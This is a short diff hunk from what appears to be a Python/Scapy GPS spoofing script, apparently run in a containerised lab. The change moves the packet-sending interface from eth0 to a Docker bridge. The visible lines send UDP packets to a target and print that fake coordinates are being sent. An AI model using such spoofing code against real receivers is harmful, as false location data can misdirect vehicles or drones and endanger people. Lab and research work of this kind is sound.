@@ -45,7 +45,7 @@ def global_pos():
 
 def send(data):
     pkt = IP(dst=TARGET_IP)/UDP(dport=TARGET_PORT)/Raw(load=data)
-    sendp(pkt, iface="eth0", verbose=False)
+    sendp(pkt, iface="br-2b4b5c170017", verbose=False)
 
 print(f"[!] GPS SPOOFING — sending fake coords to {TARGET_IP}:{TARGET_PORT}")
 print(f"[!] Fake location: {FAKE_LAT/1e7:.4f}N, {FAKE_LON/1e7:.4f}E")
